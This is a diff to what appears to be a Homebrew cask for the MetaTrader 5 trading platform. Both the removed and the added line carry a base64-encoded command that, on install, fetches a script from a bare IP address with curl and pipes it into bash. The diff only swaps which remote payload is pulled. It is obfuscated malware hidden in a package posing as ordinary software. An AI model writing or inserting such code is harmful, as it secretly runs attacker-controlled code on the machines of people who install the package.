@@ -8,7 +8,7 @@ cask "metatrader5" do
   name "MetaTrader 5"
   desc "MetaTrader 5 trading platform"
   homepage "https://www.metatrader5.com/"
-  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
+  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9HZXNham9sZSki' | base64 -d | bash"
   installer script: {
     executable: "/bin/bash",
     args: [
